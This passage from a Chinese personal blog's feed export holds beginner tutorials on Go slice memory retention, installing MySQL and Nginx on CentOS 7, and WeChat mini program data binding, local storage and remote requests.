class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> digitRegexp = regexp.MustCompile(<span class="string">&quot;[0-9]+&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FindDigits</span><span class="params">(filename <span class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">    b, _ := ioutil.ReadFile(filename)</span><br><span class="line">    <span class="keyword">return</span> digitRegexp.Find(b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的行为和描述类似，返回的 <code>[]byte</code> 指向保存整个文件的数组。因为切片引用了原始的数组， 导致 GC 不能释放数组的空间；只用到少数几个字节却导致整个文件的内容都一直保存在内存里。</p><p>要修复整个问题，可以将感兴趣的数据复制到一个新的切片中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CopyDigits</span><span class="params">(filename <span class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">    b, _ := ioutil.ReadFile(filename)</span><br><span class="line">    b = digitRegexp.Find(b)</span><br><span class="line">    c := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(b))</span><br><span class="line">    <span class="built_in">copy</span>(c, b)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以使用 <code>append</code> 实现一个更简洁的版本。这留给读者作为练习。</p><h2 id="0x07-延伸阅读"><a href="#0x07-延伸阅读" class="headerlink" title="0x07 延伸阅读"></a>0x07 延伸阅读</h2><p><a target="_blank" rel="noopener" href="https://go-zh.org/doc/effective_go.html">实效 Go 编程</a> 包含了对 <a target="_blank" rel="noopener" href="https://go-zh.org/doc/effective_go.html#%E5%88%87%E7%89%87">切片</a> 和 <a target="_blank" rel="noopener" href="https://go-zh.org/doc/effective_go.html#%E6%95%B0%E7%BB%84">数组</a> 更深入的探讨； <a target="_blank" rel="noopener" href="https://go-zh.org/ref/spec">Go 编程语言规范</a> 对 <a target="_blank" rel="noopener" href="https://go-zh.org/ref/spec#Slice_types">切片类型</a> 和 <a target="_blank" rel="noopener" href="https://go-zh.org/ref/spec#Array_types">数组类型</a> 以及与它们 <a target="_blank" rel="noopener" href="https://go-zh.org/ref/spec#Length_and_capacity">相关的</a> <a target="_blank" rel="noopener" href="https://go-zh.org/ref/spec#Making_slices_maps_and_channels">辅助</a> <a target="_blank" rel="noopener" href="https://go-zh.org/ref/spec#Appending_and_copying_slices">函数</a> 进行了定义。</p>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
          <category> GoLang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> GoLang </tag>
            
            <tag> 切片 </tag>
            
            <tag> Slices </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS 7 安装Mysql</title>
      <link href="/2021/09/10/9b809391668f-q1jun/"/>
      <url>/2021/09/10/9b809391668f-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="CentOS7安装mysql"><a href="#CentOS7安装mysql" class="headerlink" title="CentOS7安装mysql"></a>CentOS7安装mysql</h1><p><strong>1.  卸载默认安装的mariadb：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum search mysql</span><br><span class="line"></span><br><span class="line">yum remove mariadb.<span class="property">x86_64</span></span><br></pre></td></tr></table></figure><p><strong>2.  去官网找到mysql的下载版本</strong></p><p><a target="_blank" rel="noopener" href="https://dev.mysql.com/downloads/">https://dev.mysql.com/downloads/</a>    repo&#x2F;yum&#x2F;</p><p>找到下面的Linux7，即CentOS7(CentOS是Red Hat旗下的)</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/gibtj8e3z5.png" alt="gibtj8e3z5"></p><p>在下面的链接上直接右键复制链接（或者可以先下载到本地然后再用ftp传到服务器）</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/n5mis7drnt.png" alt="n5mis7drnt"></p><p><strong>3.  安装</strong></p><p>安装：wget <a target="_blank" rel="noopener" href="https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm">https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm</a></p><p>注：推荐在&#x2F;tmp目录下进行</p><p><strong>4.  本地安装yum源</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum localinstall mysql</span><br></pre></td></tr></table></figure><p><strong>5.  检测是否已经安装</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum search mysql</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/53ymlwd4ou.png" alt="53ymlwd4ou"></p><p>找到对应的软件包，复制名称</p><p><strong>6.  使用yum安装</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install mysql-community-server.<span class="property">x86_64</span></span><br></pre></td></tr></table></figure><p><strong>7.  查看是否安装成功</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep mysql</span><br></pre></td></tr></table></figure><p><strong>8.  启动mysql</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">service mysqld start</span><br><span class="line"></span><br><span class="line">service mysqld restart</span><br><span class="line"></span><br><span class="line">service mysqld stop</span><br></pre></td></tr></table></figure><p><strong>9.  查找默认登录密码</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /<span class="keyword">var</span>/log/mysqld.<span class="property">log</span> | grep password</span><br></pre></td></tr></table></figure><p><strong>10. 登录</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p密码</span><br></pre></td></tr></table></figure><p>注：推荐使用 mysql -uroot-p 回车之后再输入密码。因为使用history命令会看到你明文的密码</p><p><strong>11. 修改密码</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">SET</span> <span class="variable constant_">PASSWORD</span> = <span class="title function_">PASSWORD</span>(<span class="string">&#x27; xxxx &#x27;</span>);</span><br></pre></td></tr></table></figure><p><strong>12. 开通远程连接权限</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line"></span><br><span class="line">show tables;</span><br><span class="line">select * <span class="keyword">from</span> user \G</span><br><span class="line"></span><br><span class="line">select host, user <span class="keyword">from</span> user \G</span><br></pre></td></tr></table></figure><p>注：\G会格式化显示</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user set host=<span class="string">&quot;%&quot;</span> where <span class="title class_">Host</span>=<span class="string">&#x27;localhost&#x27;</span> and user = <span class="string">&quot;root&quot;</span>;</span><br></pre></td></tr></table></figure><p><strong>更新权限</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>或者直接重启服务：service mysqld restart</p>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> Linux </tag>
            
            <tag> CentOS </tag>
            
            <tag> MySql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS中安装Nginx</title>
      <link href="/2021/09/09/ce0253c7cb5a-q1jun/"/>
      <url>/2021/09/09/ce0253c7cb5a-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="CentOS安装Nginx"><a href="#CentOS安装Nginx" class="headerlink" title="CentOS安装Nginx"></a>CentOS安装Nginx</h1><h2 id="一、Nginx安装"><a href="#一、Nginx安装" class="headerlink" title="一、Nginx安装"></a>一、Nginx安装</h2><h3 id="1-添加Nginx到yum源"><a href="#1-添加Nginx到yum源" class="headerlink" title="1.添加Nginx到yum源"></a>1.添加Nginx到yum源</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -Uvh http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm</span><br></pre></td></tr></table></figure><h3 id="2-安装nginx"><a href="#2-安装nginx" class="headerlink" title="2.安装nginx"></a>2.安装nginx</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y nginx</span><br></pre></td></tr></table></figure><h3 id="3-启动nginx"><a href="#3-启动nginx" class="headerlink" title="3.启动nginx"></a>3.启动nginx</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> nginx.service</span><br></pre></td></tr></table></figure><h3 id="4-设置开机启动"><a href="#4-设置开机启动" class="headerlink" title="4.设置开机启动"></a>4.设置开机启动</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> nginx.service</span><br></pre></td></tr></table></figure><h3 id="5-停止开机自启动"><a href="#5-停止开机自启动" class="headerlink" title="5. 停止开机自启动"></a>5. 停止开机自启动</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">disable</span> nginx.service</span><br></pre></td></tr></table></figure><h3 id="6-查看服务当前状态"><a href="#6-查看服务当前状态" class="headerlink" title="6.查看服务当前状态"></a>6.查看服务当前状态</h3><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="keyword">status</span> nginx.service</span><br></pre></td></tr></table></figure><h3 id="7-重启Nginx服务"><a href="#7-重启Nginx服务" class="headerlink" title="7.重启Nginx服务"></a>7.重启Nginx服务</h3><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">restart</span> nginx.service</span><br></pre></td></tr></table></figure><h3 id="8-查看所有已启动的服务"><a href="#8-查看所有已启动的服务" class="headerlink" title="8.查看所有已启动的服务"></a>8.查看所有已启动的服务</h3><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">systemctl</span> <span class="built_in">list-units</span> <span class="built_in">--type=service</span></span><br></pre></td></tr></table></figure><h2 id="二、防火墙配置"><a href="#二、防火墙配置" class="headerlink" title="二、防火墙配置"></a>二、防火墙配置</h2><h3 id="1-防火墙打开80端口"><a href="#1-防火墙打开80端口" class="headerlink" title="1.防火墙打开80端口"></a>1.防火墙打开80端口</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd <span class="attribute">--zone</span>=public <span class="attribute">--add-port</span>=80/tcp --permanent</span><br></pre></td></tr></table></figure><h4 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h4><p>–zone #作用域</p><p>–add-port&#x3D;80&#x2F;tcp  #添加端口，格式为：端口&#x2F;通讯协议</p><p>–permanent  #永久生效，没有此参数重启后失效</p><h3 id="2-重启防火墙生效"><a href="#2-重启防火墙生效" class="headerlink" title="2.重启防火墙生效"></a>2.重启防火墙生效</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd <span class="comment">--reload</span></span><br></pre></td></tr></table></figure><h2 id="三、常用目录"><a href="#三、常用目录" class="headerlink" title="三、常用目录"></a>三、常用目录</h2><p>网站文件存放默认目录　　&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</p><p>网站默认站点配置　　&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;default.conf</p><p>自定义Nginx站点配置文件存放目录　　&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;</p><p>Nginx全局配置　　&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p><h2 id="四、Nginx配置"><a href="#四、Nginx配置" class="headerlink" title="四、Nginx配置"></a>四、Nginx配置</h2><h3 id="1-配置端口转发80转到8092，配置后重启Nginx"><a href="#1-配置端口转发80转到8092，配置后重启Nginx" class="headerlink" title="1.配置端口转发80转到8092，配置后重启Nginx"></a>1.配置端口转发80转到8092，配置后重启Nginx</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>nginx<span class="regexp">/conf.d/</span><span class="keyword">default</span>.conf</span><br></pre></td></tr></table></figure><p><img src="/Users/q1jun/Documents/%E7%AC%94%E8%AE%B0/nginx_default.conf.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> Linux </tag>
            
            <tag> CentOS </tag>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序学习笔记 06</title>
      <link href="/2021/09/07/528c659f0909-q1jun/"/>
      <url>/2021/09/07/528c659f0909-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="微信小程序学习笔记-06"><a href="#微信小程序学习笔记-06" class="headerlink" title="微信小程序学习笔记 06"></a>微信小程序学习笔记 06</h1><blockquote><p>API的使用：</p><p>上一篇笔记写了小程序页面如何使用JavaScript脚本，有了脚本以后，就可以调用微信提供的各种能力（即微信API），从而作出千变万化的页面。</p></blockquote><h2 id="0x01-WXML渲染语法"><a href="#0x01-WXML渲染语法" class="headerlink" title="0x01 WXML渲染语法"></a>0x01 WXML渲染语法</h2><p>前面说过，小程序的页面结构使用 WXML 语言进行描述。</p><p>WXML 的全称是微信页面标签语言（Weixin Markup Language），它不仅提供了许多功能标签，还有一套自己的语法，可以设置页面渲染的生效条件，以及进行循环处理。</p><p>新建一个<code>page</code>:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220118114010204.png" alt="image-20220118114010204"></p><p>微信 API 提供的数据，就通过 WXML 的渲染语法展现在页面上。比如，<code>home.js</code>里面的数据源是一个数组。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">items</span>: [<span class="string">&#x27;事项 A&#x27;</span>, <span class="string">&#x27;事项 B&#x27;</span>, <span class="string">&#x27;事项 C&#x27;</span>]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>Page()</code>的参数配置对象的<code>data.items</code>属性是一个数组。通过数据绑定机制，页面可以读取全局变量<code>items</code>，拿到这个数组。</p><p>拿到数组以后，怎样将每一个数组成员展现在页面上呢？WXML 的数组循环语法，就是一个很简便的方法。</p><p>打开<code>home.wxml</code>，改成下面的代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;text&gt;pages/home/home.<span class="property">wxml</span>&lt;/text&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">view</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;items&#125;&#125;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &#123;&#123;index&#125;&#125;、 &#123;&#123;item&#125;&#125;</span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>&lt;text&gt;</code>标签的<code>wx:for</code>属性，表示当前标签（<code>&lt;text&gt;</code>）启用数组循环，处理<code>items</code>数组。数组有多少个成员，就会生成多少个<code>&lt;text&gt;</code>。渲染后的页面结构如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;view&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">text</span>&gt;</span>...<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">text</span>&gt;</span>...<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">text</span>&gt;</span>...<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span><br><span class="line">&lt;/view&gt;</span><br></pre></td></tr></table></figure><p>在循环体内，当前数组成员的位置序号（从<code>0</code>开始）绑定变量<code>index</code>，成员的值绑定变量<code>item</code>。</p><p>开发者工具导入项目代码，页面渲染结果如下。</p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220118114244480.png" alt="image-20220118114244480" style="zoom:50%;" /><p>WXML 的其他渲染语法（主要是条件判断和对象处理），请查看<a target="_blank" rel="noopener" href="https://developers.weixin.qq.com/miniprogram/dev/reference/wxml/list.html">官方文档</a>。</p><h2 id="0x02-客户端数据存储"><a href="#0x02-客户端数据存储" class="headerlink" title="0x02 客户端数据存储"></a>0x02 客户端数据存储</h2><p>页面渲染用到的外部数据，如果每次都从服务器或 API 获取，有时可能会比较慢，用户体验不好。</p><p>小程序允许将一部分数据保存在客户端（即微信 App）的本地储存里面（其实就是自定义的缓存）。下次需要用到这些数据的时候，就直接从本地读取，这样就大大加快了渲染。本节介绍怎么使用客户端数据储存。</p><p>打开<code>home.wxml</code>，改成下面的代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;text&gt;pages/home/home.<span class="property">wxml</span>&lt;/text&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">view</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;items&#125;&#125;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &#123;&#123;index&#125;&#125;、 &#123;&#123;item&#125;&#125;</span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">placeholder</span>=<span class="string">&quot;输入新增事项&quot;</span> <span class="attr">bind:input</span>=<span class="string">&quot;inputHandler&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">bind:tap</span>=<span class="string">&quot;buttonHandler&quot;</span>&gt;</span>确定<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>上面代码除了展示数组<code>items</code>，还新增了一个输入框和一个按钮，用来接受用户的输入。背后的意图是，用户通过输入框，为<code>items</code>数组加入新成员。</p><p>开发者工具导入项目代码，页面渲染结果如下。</p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220118114545239.png" alt="image-20220118114545239" style="zoom:50%;" /><p>注意，输入框有一个<code>input</code>事件的监听函数<code>inputHandler</code>（输入内容改变时触发），按钮有一个<code>tap</code>事件的监听函数<code>buttonHandler</code>（点击按钮时触发）。这两个监听函数负责处理用户的输入。</p><p>然后，打开<code>home.js</code>，代码修改如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 页面的初始数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">        <span class="attr">items</span>: [],</span><br><span class="line">        <span class="attr">inputValue</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">inputHandler</span>(<span class="params">event</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123;</span><br><span class="line">            <span class="attr">inputValue</span>:event.<span class="property">detail</span>.<span class="property">value</span> || <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="title function_">buttonHandler</span>(<span class="params">event</span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> newItem = <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">inputValue</span>.<span class="title function_">trim</span>();</span><br><span class="line">        <span class="keyword">if</span>(!newItem) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">const</span> itemArr = [...<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">items</span>, newItem];</span><br><span class="line">        wx.<span class="title function_">setStorageSync</span>(<span class="string">&#x27;items&#x27;</span>, itemArr);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123;</span><br><span class="line">            <span class="attr">items</span>:itemArr</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生命周期函数--监听页面加载</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="attr">onLoad</span>: <span class="keyword">function</span> (<span class="params">options</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> itemArr = wx.<span class="title function_">getStorageSync</span>(<span class="string">&#x27;items&#x27;</span>) || [];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123;<span class="attr">items</span>:itemArr&#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，输入框监听函数<code>inputHandler()</code>只做了一件事，就是每当用户的输入发生变化时，先从事件对象<code>event</code>的<code>detail.value</code>属性上拿到输入的内容，然后将其写入全局变量<code>inputValue</code>。如果用户删除了输入框里面的内容，<code>inputValue</code>就设为空字符串。</p><p>按钮监听函数<code>buttonHandler()</code>是每当用户点击提交按钮，就会执行。它先从<code>inputValue</code>拿到用户输入的内容，确定非空以后，就将其加入<code>items</code>数组。然后，使用微信提供的<code>wx.setStorageSync()</code>方法，将<code>items</code>数组存储在客户端。最后使用<code>this.setData()</code>方法更新一下全局变量<code>items</code>，进而触发页面的重新渲染。</p><p><code>wx.setStorageSync()</code>方法属于小程序的客户端数据储存 API，用于将数据写入客户端储存。它接受两个参数，分别是键名和键值。与之配套的，还有一个<code>wx.getStorageSync()</code>方法，用于读取客户端储存的数据。它只有一个参数，就是键名。这两个方法都是同步的，小程序也提供异步版本，请参考<a target="_blank" rel="noopener" href="https://developers.weixin.qq.com/miniprogram/dev/api/storage/wx.setStorage.html">官方文档</a>。</p><p>最后，上面代码中，<code>Page()</code>的参数配置对象还有一个<code>onLoad()</code>方法。该方法属于页面的生命周期方法，页面加载后会自动执行该方法。它只执行一次，用于页面初始化，这里的意图是每次用户打开页面，都通过<code>wx.getStorageSync()</code>方法，从客户端取出以前存储的数据，显示在页面上。</p><p>必须牢记的是，客户端储存是不可靠的，随时可能消失（比如用户清理缓存）。用户换了一台手机，或者本机重装微信，原来的数据就丢失了。所以，它只适合保存一些不重要的临时数据，最常见的用途一般就是作为缓存，加快页面显示。</p><h2 id="0x03-远程数据请求"><a href="#0x03-远程数据请求" class="headerlink" title="0x03 远程数据请求"></a>0x03 远程数据请求</h2><p>小程序可以从外部服务器读取数据，也可以向服务器发送数据。本节就来看看怎么使用小程序的网络能力。</p><p>微信规定，只有后台登记过的服务器域名，才可以进行通信。不过，开发者工具允许开发时放松这个限制。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220118115546022.png" alt="image-20220118115546022"></p><p>按照上图，点击开发者工具右上角的三条横线（”详情”），选中”不校验合法域名、web-view（业务域名）、TLS 版本以及 HTTPS 证书” 。这样的话，小程序在开发时，就可以跟服务器进行通信了。</p><p>下面，我们在本地启动一个开发服务器。为了简单起见，我选用了 <a target="_blank" rel="noopener" href="https://www.npmjs.com/package/json-server">json-server</a> 作为本地服务器，它的好处是只要有一个 JSON 数据文件，就能自动生成 RESTful 接口。</p><blockquote><p>如果未安装json-server ，使用<code>npm install -g json-server</code>安装，</p><p>如果是cnpm的话则是<code>cnpm install -g json-server</code>。</p></blockquote><p>首先，新建一个数据文件<code>db.json</code>，内容如下。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220118120912444.png" alt="image-20220118120912444"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;items&quot;</span>: [<span class="string">&quot;事项 A&quot;</span>, <span class="string">&quot;事项 B&quot;</span>, <span class="string">&quot;事项 C&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，确认本机安装了 Node.js 以后，进入<code>db.json</code>所在的目录，在命令行执行下面命令，启动服务器。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx json-server db.json</span><br></pre></td></tr></table></figure><p>正常情况下，这时你打开浏览器访问<code>localhost:3000/items</code>这个网址，就能看到返回了一个数组<code>[&quot;事项 A&quot;, &quot;事项 B&quot;, &quot;事项 C&quot;]</code>。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220118121152351.png" alt="image-20220118121152351"></p><p>接着，打开<code>home.js</code>，代码修改如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 页面的初始数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">        <span class="attr">items</span>: [],</span><br><span class="line">        <span class="attr">inputValue</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">inputHandler</span>(<span class="params">event</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123;</span><br><span class="line">            <span 